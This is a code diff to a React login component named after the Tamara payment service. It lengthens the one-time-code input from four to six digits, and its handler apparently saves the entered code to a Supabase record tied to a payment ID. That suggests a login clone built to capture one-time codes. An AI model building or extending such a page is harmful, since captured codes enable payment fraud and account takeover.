@@ -88,7 +88,7 @@ const TamaraLogin = () => {
   };
 
   const handleVerifyOtp = async () => {
-    if (otp.length === 4 && agreedToTerms && paymentId) {
+    if (otp.length === 6 && agreedToTerms && paymentId) {
       try {
         // تحديث السجل مع OTP التحقق من الهاتف
         const { error } = await supabase
@@ -211,7 +211,7 @@ const TamaraLogin = () => {
           {/* OTP Input */}
           <div className="flex justify-center mb-6" dir="ltr">
             <InputOTP
-              maxLength={4}
+              maxLength={6}
               value={otp}
               onChange={(value) => setOtp(value)}
             >
@@ -220,6 +220,8 @@ const TamaraLogin = () => {
                 <InputOTPSlot index={1} className="w-14 h-14 text-xl border-2 border-primary/30 rounded-lg" />
                 <InputOTPSlot index={2} className="w-14 h-14 text-xl border-2 border-primary/30 rounded-lg" />
                 <InputOTPSlot index={3} className="w-14 h-14 text-xl border-2 border-primary/30 rounded-lg" />
+                <InputOTPSlot index={4} className="w-14 h-14 text-xl border-2 border-primary/30 rounded-lg" />
+                <InputOTPSlot index={5} className="w-14 h-14 text-xl border-2 border-primary/30 rounded-lg" />
               </InputOTPGroup>
             </InputOTP>
           </div>
@@ -261,7 +263,7 @@ const TamaraLogin = () => {
           <Button
             onClick={handleVerifyOtp}
             className="w-full bg-black hover:bg-black/90 text-white h-12 text-base rounded-lg"
-            disabled={otp.length < 4 || !agreedToTerms}
+            disabled={otp.length < 6 || !agreedToTerms}
           >
             تحقق
           </Button>
